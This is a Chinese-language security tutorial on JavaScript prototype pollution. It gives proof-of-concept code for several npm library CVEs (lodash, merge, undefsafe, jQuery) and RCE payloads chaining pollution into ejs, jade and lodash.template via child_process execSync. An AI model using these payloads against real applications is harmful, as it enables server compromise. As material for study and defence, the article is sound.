0x00 前言
=======

这里来简单说一下我总结到的 JS 的各种概念。

JS 中是万物皆对象的，JS中函数的概念和其他大部分语言的概念是不一样的。在 JS 中，函数的创建有非常多的方式，这里可以看到 [这篇文章](https://wenku.baidu.com/view/792d4d2b084c2e3f5727a5e9856a561252d32101.html) ，这还是正常的原生 JS 中的创建一个函数的方式，JS 语言是非常灵活的，但是灵活的背后正是一系列复杂的概念的支撑。

JS 会在创建一个函数的时候自动为函数添加 prototype 属性，该属性的值是一个具有 constructor 属性的对象。  
一旦我们把这个函数作为构造函数调用（即 new 关键字）就是实例化，JS 会创建该构造函数的实例，实例继承构造函数 prototype 的所有属性和方法，表现上会有一定的不同（比如实例会通过设置自己的 `__proto__` 指向构造函数的 prototype 来实现这种继承），这和常见的面向对象变成是很不一样的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-709408aba52b162ea44baffa64dfe468bd3f7aee.png)

可以这个图辅助理解上面的话。

我们在原型链污染的时候，要做的就是通过 `__proto__` 不断向上找到最初的 Object ，然后通过控制它的属性来实现对所有继承自它的函数以及函数的实例进行污染，进而通过污染将我们的恶意代码写入，接下来通过对代码进行审计来寻找命令执行的点，比如遍历来进行执行命令的操作；或者污染某些空的属性，来通过对其赋值来实现任意的命令执行：

```js
{"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}
```

或者实现一些其他有利于我们实现恶意攻击的操作，比如将 admin 更改为 1。

用到多的实际上还是 RCE，在能够通过原型链污染来控制属性之后也就会有很多的 RCE 的机会了，这里我将他们归为两步，第一步就是原型链污染，第二步则是后续的去实现 RCE 的部分。

0x01 prototype pollution attack 1
=================================

也就是第一步，原型链污染，发现这里的 CVE 实在是太多了...

npm 是会给用户提示的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a37801816f3217542f981388d1141b106c21ce81.png)

Merge 类操作导致原型链污染
----------------

原型链污染主要的思想实际上就是寻找能够 **操纵键值** 的位置，然后利用 **proto** 来往上进行污染。

```js
const merge = (a, b) => {    // 发现 merge 危险操作
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}

const clone = (a) => {
  return merge({}, a);
}
```

merge clone 这两个方法是 P牛 在文章中就提出来的，实际上在真实的环境中也是经常会被用到的，这里我们可以看到上面的示例代码，取自 \[GYCTF2020\]Ez\_Express 这道题目。

题目中，我们使用了 merge 方法来进行操作处理，merge 方法用在 merge 操作以及 clone 操作中，来自于 merge 类。

我们利用 merge 来合并两个复杂的对象，用 clone 来创建一个与现在的对象相同的对象，可以想象到，这两个方法在变相对象的时候会有多么的实用

```js
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

let object1 = {}
let object2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(object1, object2)
console.log(object1.a, object1.b)

object3 = {}
console.log(object3.b)
```

`"__proto__"` 这里还涉及到 JSON 解析的问题，具体可以看 [P牛博客](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html) ，我们还要感谢 HTTP 为我们提供了 Content-Type 设为 application/json 的机会

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-74d8dada8df4f2e45b41f2d60dfbeeb0d3df9dd9.png)

```js
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

function clone(a) {
  return merge({}, a);
}

let object1 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}');

clone(object1)
console.log(object1.a);
console.log(object1.b);

object2 = {}
console.log(object2.b)
```

clone 实际上也是一样的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-399d313475f7b81616982d38288e10dd19ed0e40.png)

这里补充一下 JS 中的执行系统命令

```js
t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"}
```

这是我们拼接进原型链污染内执行命令的内容，这里涉及到了 JS 沙箱的绕过，后续单独开一篇学习，[参考文章](https://zhuanlan.zhihu.com/p/58600028)。

### merge.recursiveMerge CVE-2020-28499

此 CVE 影响 2.1.1 以下的 merge 版本

测试代码：

```js
const merge = require('merge');

const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');

let obj1 = {x: {y:1}};

console.log("Before : " + obj1.polluted);
merge.recursive(obj1, payload2);
console.log("After : " + obj1.polluted);
console.log("After : " + {}.polluted);
```

结果如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-89b0e277d007da642092faf44c59e51157066b8b.png)

原因在于这里，又让我们可以控制键值了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c46716c0198c5955a27ce1e8a785439326955b8a.png)

修复

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fcedf5a841f40ddb9a760a9aad5c513f6c99285f.png)

Undefsafe 模块原型链污染（CVE-2019-10795）
---------------------------------

```js
var object = {
    a: {
        b: {
            c: 1,
            d: [1,2,3],
            e: 'whoami'
        }
    }
};
console.log(object.a.b.e)

console.log(object.a.c.e)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-04c14947cd68e76bbcc0642498b2a2daeca6f1b3.png)

可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：

在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-50849a0da121b3a7ea15c0cf04caf200cf98c59c.png)

还有一个功能，在对对象赋值时，如果目标属性存在其可以帮助我们修改对应属性的值：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d4d8734695cf9c423cc2ea963838ccb041dcd182.png)

如果当属性不存在时，我们想对该属性赋值：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4ba4a2b841cdaa8861636fa89deb0f960b3867de.png)

访问属性会在上层进行创建并赋值

### 漏洞

通过以上演示我们可知，undefsafe 是一款支持设置值的函数，不过在 undefsafe 模块在小于2.0.3版本，这个功能处存在原型链污染漏洞（CVE-2019-10795）。

我们在 2.0.3 版本中进行测试：

```js
var a = require("undefsafe");
var object = {
    a: {
        b: {
            c: 1,
            d: [1,2,3],
            e: 'skysec'
        }
    }
};
var payload = "__proto__.toString";
a(object,payload,"evilstring");
console.log(object.toString);
// [Function: toString]
```

但是如果在低于 2.0.3 版本运行，则会得到如下输出：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6a3ddeca59e65e15bc69452b98ee87ce372af2ba.png)

可见，当 undefsafe() 函数的第 2，3 个参数可控时，我们便可以污染 object 对象中的值。

```js
var a = require("undefsafe");
var test = {}
console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
// this is [object Object]
```

返回：\[object Object\]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：

```js
var a = require("undefsafe");
var test = {}
a(test,'__proto__.toString',function(){ return 'just a evil!'})
console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
// this is just a evil!
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-610e776dcac222bc6b8ad792e0df4a23a7cf2511.png)

Lodash 模块原型链污染
--------------

Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000 万次。但是这个库中有几个严重的原型污染漏洞。

### lodash.defaultsDeep 方法 `CVE-2019-10744`

2019 年 7 月 2 日，[Snyk 发布了一个高严重性原型污染安全漏洞](https://snyk.io/vuln/SNYK-JS-LODASH-450202)（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。

Lodash 库中的 `defaultsDeep` 函数可能会被包含 `constructor` 的 Payload 诱骗添加或修改`Object.prototype` 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：

```js
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```

我们在 `mergeFn({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-65050932685a6cb24ff829e7619ac54634689858.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7dfa26453ac16b5c8f41acc94b38ff3448a37953.png)

此时我们已经污染到原型了。

我们可以看一下修复的方法：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2b5bbbc6f722b3fab99774080ecd0c732c1abe42.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b4ed99f282d6ad2281646842f2351aa12c8ac22f.png)

可以看到，safeGet 中新增了对 constructor 的检测赖确保我们不能通过恶意的输入来进行污染，下面新增的 test 是为了测试会不会发生 constroctor 的问题，双重保险。

### lodash.merge 方法 `CVE-2018-3721`

lodash.merge 就不需要多说了，这里实际上和我们前面的 merge 是一样的。这里我们可以去研究一下它的源码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fa30de705447bfa25d09c45fc8be91674093a98a.png)

merge 方法是基于 baseMerge 的，我们来到 baseMerge 处

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-72241d83e929118719429889eb5d28bdceb3f27b.png)

可以看到，这里实际上也没有进行 merge 的操作，而是进行了一系列的 if ，进行了整理与划分。

我们 merge 的对象一定是 object ，我们会在 第二处 if 处进入，来到 baseMergeDeep 方法。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-54f1164dd724bc10187e9104fbca34afbf51293c.png)

可以看到，我们首先要进入到 baseAssignValue

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a3d62c9ab1dcdbb04458b819e328ad2e261f0a29.png)

这里的 if 判断可以绕过，最终进入 `object[key] = value` 的赋值操作，这里对键值进行了操作们也就是说我们可以利用这里来实现原型链污染了。

POC:

```js
var lodash= require('lodash');
var payload = '{"__proto__":{"polluted":"yes"}}';

var a = {};
console.log("Before polluted: " + a.polluted);
lodash.merge({}, JSON.parse(payload));
console.log("After polluted: " + a.polluted);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c35c63e82fddaba89d83419b8c161dda91a9b415.png)

POC 测试，`lodash.merge({}, JSON.parse(payload));`

### lodash.mergeWith 方法 `CVE-2018-16487`

POC:

```js
var lodash= require('lodash');
var payload = '{"__proto__":{"polluted":"yes"}}';

var a = {};
console.log("Before polluted: " + a.polluted);
lodash.mergeWith({}, JSON.parse(payload));
console.log("After polluted: " + a.polluted);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5ae9c6ea5160293ffe0558d5d6a6c1b378f582a7.png)

这里就不进行进一步分分析了，几乎可以说是和 merge 一模一样

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ffa613e677a2cf832b844b94e68ff02d82eaa4b2.png)

### lodash.set 方法 以及 setWith 方法 `CWE-400`

POC:

```js
lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(Object.prototype)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8f356f6a951d64cb2f6c0bdd759d9be394d8563f.png)

### lodash.zipObjectDeep 方法 `CVE-2020-8203`

影响版本 &lt; 4.17.20

```js
const _ = require('lodash');
_.zipObjectDeep(['__proto__.z'],[123])
console.log(z) // 123
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-22d7a105a0a01497cfb751f8e331dfa3c19934b3.png)

**这里关于影响版本的问题，很玄学，不能简单的相信 CVE 上所标注好的。**

0x02 其他小众原型链污染
==============

safe-obj 原型链污染 `CVE-2021-25928`
-------------------------------

POC:

```js
var safeObj = require("safe-obj");
var obj = {};
console.log("Before : " + {}.polluted);
safeObj.expand(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-073593d29eb7d4a0698cde42376615dbfbbca20d.png)

safe-falt 原型链污染 `CVE-2021-25927`
--------------------------------

POC:

```js
var safeFlat = require("safe-flat");
console.log("Before : " + {}.polluted);
safeFlat.unflatten({"__proto__.polluted": "Yes! Its Polluted"}, '.');
console.log("After : " + {}.polluted);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2f5f2d9a088bfd4b2ee1c287f2488b3f296be350.png)

jQuery 原型链污染 `CVE-2019-11358`
-----------------------------

POC:

```js
var jquery = document.createElement('script');
jquery.src = 'https://code.jquery.com/jquery-3.3.1.min.js';

let exp = $.extend(true, {}, JSON.parse('{"__proto__": {"exploit": "sp4c1ous"}}'));
console.log({}.exploit);
```

这里注意，大坑。

npm 是区分大小写的，我们的 jquery 在镜像库中是全小写的，虽然它的产品名里有大写。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cc77c341a660faee805b4d35dd2b01e1dfbd0518.png)

当然，肯定会有更多更多，大佬们当时肯定是三下五除二写好脚本，开着自己的扫描就冲去挖 CVE 了。

### console.table 原型链污染 `CVE-2022-21824`

Node.js &lt; 12.22.9, &lt; 14.18.3, &lt; 16.13.2, and &lt; 17.3.1

POC:

```js
console.table([{a:1}], ['__proto__'])
console.table([{x:1}], ["__proto__"]);
```

0x03 prototype pollution attack 2
=================================

到了第二步，我们就要 to RCE 了

配合 lodash.template 实现 RCE
-------------------------

Lodash.template 是 Lodash 中的一个简单的模板引擎，创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。 详情请看：<http://lodash.think2011.net/template>

在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 `sourceURL` 属性

我们可以看到对 shourceURL 的定义，可以看到 sourceURL 属性是通过一个三目运算法赋值，其默认值为空

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0f1607bfdf2fc63283526786e974b0c70fafccf6.png)

再看到调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6c19fd3f36a440b748c7247bb7e5a8ee87ca00f2.png)

显然，这里是一个危险的操作， sourceURL 被拼接进了 函数构造里，作为第二个参数，我们可以利用这里来实现任意的代码执行。

这里要注意的是 Function 内是没有 require 函数的，我们不能直接使用 `require('child_process')` ，但是我们可以使用 `global.process.mainModule.constructor._load` 这一串来代替，后续的调用就很简单了。

```js
\u000areturn e => {return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"}
```

配合 ejs 模板引擎实现 RCE `CVE-2022-29078`
----------------------------------

Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用 lodash.merge 方法中的原型链污染漏洞。

### 测试

app.js

```js
var express = require('express');
var lodash = require('lodash');
var ejs = require('ejs');

var app = express();
//设置模板的位置与种类
app.set('views', __dirname);
app.set('views engine','ejs');

//对原型进行污染
var malicious_payload = '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}';
lodash.merge({}, JSON.parse(malicious_payload));

//进行渲染
app.get('/', function (req, res) {
    res.render ("index.ejs",{
        message: 'sp4c1ous'
    });
});

//设置http
var server = app.listen(8000, function () {

    var host = server.address().address
    var port = server.address().port

    console.log("应用实例，访问地址为 http://%s:%s", host, port)
});
```

index.ejs

```js

<html>
<head>
    <meta charset="utf-8">
    <title></title>
</head>
<body>

<h1><%= message%></h1>

</body>
</html>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-55c56464ce3d197969779f83be4340541ceb22b5.png)

对原型链进行污染的部分就是这里的 lodash.merge 操作，我们通过对 outputFunctionName 进行 原型链污染 后的赋值来实现 RCE ，语句为

```js
"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"
```

我们调试一下这个过程

我们从 response.js 进入了 application.js

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d8693c15e5034404b77329a6c62faa8ea37586e2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-eab951cdd84ec3e873d0b7397493971b0ff20c87.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-76bcd345f915df758974089c9675b12d18995086.png)

至此，调用了 engine，正式进入 ejs.js，发现 renderFile 的最后又调用到了 `tryHandleCache` ，跟进

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ce3134bf2f27146dd549dc4a867e50419b42577a.png)

继续跟进，从这里进入了 `handleCache`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-dc9f70cd0603b834a9efb83b8a6327de02d53703.png)

然后在 `handleCache` 方法中进入 `compile` 方法，这是我们渲染模板所使用的方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7a86754aa3cd728cac23852f7bd3c3a3475b7e90.png)

进入 Template 方法，然后 `return templ.compile();` ，来到 `compile: function ()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ac67528c696b6547ddb4d9f8967ed5456dcd6098.png)

在这里我们可以看到大量的渲染拼接，我们要利用的 `outputFunctionName` 就在其中

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e7ef15f9cd9d192303169dd56b145421310fe18f.png)

最终我们原型链污染后的内容被送进了 VM 中执行

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0f12d95f6ccef3706aa32be1a8f9d8b73da394e6.png)

配合 jade 模板引擎实现 RCE
------------------

jade 模板引擎也可以帮助我们实现 原型链污染 to RCE ，这里实际上就是 SSTI，我们可以在这篇 [经典的文章](https://portswigger.net/research/server-side-template-injection) 中看到它。

直接给出最终的 POC

```js
{"__proto__":{"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('calc'))"}}
```

0x04 参考文章
=========

<https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs>  
<https://www.whitesourcesoftware.com/>  
<https://www.anquanke.com/post/id/177093>  
<https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/>  
<https://cloud.tencent.com/developer/article/1841463>  
<https://threezh1.com/2020/01/30/NodeJsVulns/#node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E-CVE-2017-5941>  
<https://www.anquanke.com/post/id/242645#h3-9>  
<https://www.anquanke.com/post/id/248170#h2-0>  
<https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html>  
<https://xz.aliyun.com/t/2735>  
etc.